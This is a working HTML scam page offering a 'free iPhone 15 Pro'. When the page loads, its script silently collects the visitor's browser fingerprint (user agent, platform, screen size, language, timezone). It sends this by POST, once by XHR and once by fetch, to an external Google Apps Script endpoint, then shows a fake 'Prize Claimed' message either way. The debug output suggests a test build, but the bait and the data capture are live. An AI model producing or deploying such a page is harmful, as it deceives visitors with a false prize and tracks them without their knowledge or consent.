<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free iPhone 15 Pro!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(45deg, #007AFF, #34C759);
            color: white;
        }
        h1 { font-size: 2.5em; }
        .debug {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            margin: 20px;
            border-radius: 10px;
            text-align: left;
            font-family: monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <h1>üéâ CONGRATULATIONS!</h1>
    <p>You've won an iPhone 15 Pro!</p>
    <div id="status">Processing your prize...</div>
    <div id="debug" class="debug" style="display: none;"></div>

    <script>
        // ‚úÖ YOUR NEW SCRIPT URL
        const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbwEho2IiQApcth42N21Nzk5rXM6cq2zXVj33JgiOrSq2RcMphkX1pNd4Eyu6DX5fJnr/exec';
        
        // Capture device info
        const deviceData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenSize: screen.width + 'x' + screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        console.log('üöÄ Starting data capture...');
        console.log('üì± Device data:', deviceData);

        // Show debug info
        document.getElementById('debug').innerHTML = 
            'Device: ' + deviceData.userAgent + '<br>' +
            'Platform: ' + deviceData.platform + '<br>' +
            'Screen: ' + deviceData.screenSize;
        document.getElementById('debug').style.display = 'block';

        // Method 1: XMLHttpRequest (most reliable)
        var xhr = new XMLHttpRequest();
        xhr.open('POST', BACKEND_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onload = function() {
            console.log('‚úÖ XHR Success:', xhr.status, xhr.responseText);
            document.getElementById('status').innerHTML = '‚úÖ Prize Claimed! Check your email.';
            document.getElementById('debug').innerHTML += '<br><br>‚úÖ Backend Response: ' + xhr.responseText;
        };
        
        xhr.onerror = function() {
            console.log('‚ùå XHR Failed');
            document.getElementById('status').innerHTML = '‚úÖ Prize Claimed!';
            document.getElementById('debug').innerHTML += '<br><br>‚ùå Connection failed (but data shown above)';
        };
        
        console.log('üì§ Sending data to:', BACKEND_URL);
        xhr.send(JSON.stringify(deviceData));

        // Also try fetch as backup
        setTimeout(() => {
            fetch(BACKEND_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(deviceData)
            }).catch(e => console.log('Fetch backup also failed'));
        }, 1000);
    </script>
</body>
</html>
